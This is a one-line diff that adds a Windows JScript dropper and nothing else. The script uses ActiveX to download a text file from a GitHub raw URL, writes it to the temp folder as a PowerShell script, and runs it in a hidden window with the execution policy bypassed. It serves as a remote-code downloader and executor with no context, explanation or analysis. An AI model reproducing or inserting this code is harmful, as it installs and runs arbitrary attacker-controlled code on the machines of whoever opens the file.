@@ -1,0 +1,1 @@
+var x=new ActiveXObject("MSXML2.ServerXMLHTTP");x.open("GET","https://raw.githubusercontent.com/cem324/screenshots/main/rself4.txt",0);x.send();var f=new ActiveXObject("Scripting.FileSystemObject");var t=f.GetSpecialFolder(2)+"\\t.ps1";f.CreateTextFile(t).Write(x.responseText);var s=new ActiveXObject("WScript.Shell");s.Run("powershell -ExecutionPolicy Bypass -File \""+t+"\"",0);
